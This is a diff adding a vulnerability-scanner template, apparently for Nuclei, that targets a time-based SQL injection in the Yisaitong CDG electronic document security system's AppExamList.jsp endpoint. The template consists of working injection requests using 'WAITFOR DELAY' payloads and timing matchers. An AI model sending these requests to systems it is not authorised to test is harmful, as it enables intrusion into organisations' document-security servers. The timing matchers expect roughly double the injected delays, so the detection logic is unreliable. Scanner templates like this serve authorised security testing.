@@ -1,0 +1,30 @@
+id: yisaitong-CDG-AppExamList_jsp-sql-time
+
+info:
+  name: 亿赛通电子文档安全管理系统 AppExamList.jsp SQL注入漏洞
+  author: yisaitong
+  severity: high
+  tags: yisaitong
+
+http:
+  - raw:
+      - |
+        POST /CDGServer3/client/AppExamList.jsp;Servicelogin HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Referer: https://{{Hostname}}/CDGServer3/client/AppExamList.jsp;Servicelogin
+
+        username=1'WAITFOR+DELAY'0%3a0%3a2'--
+      - |
+        POST /CDGServer3/client/AppExamList.jsp;Servicelogin HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Referer: https://{{Hostname}}/CDGServer3/client/AppExamList.jsp;Servicelogin
+
+        username=1'WAITFOR+DELAY'0%3a0%3a4'--
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration_1>=4 && duration_1<=5'  
+          - 'duration_2>=8 && duration_2<=9'
+        condition: and
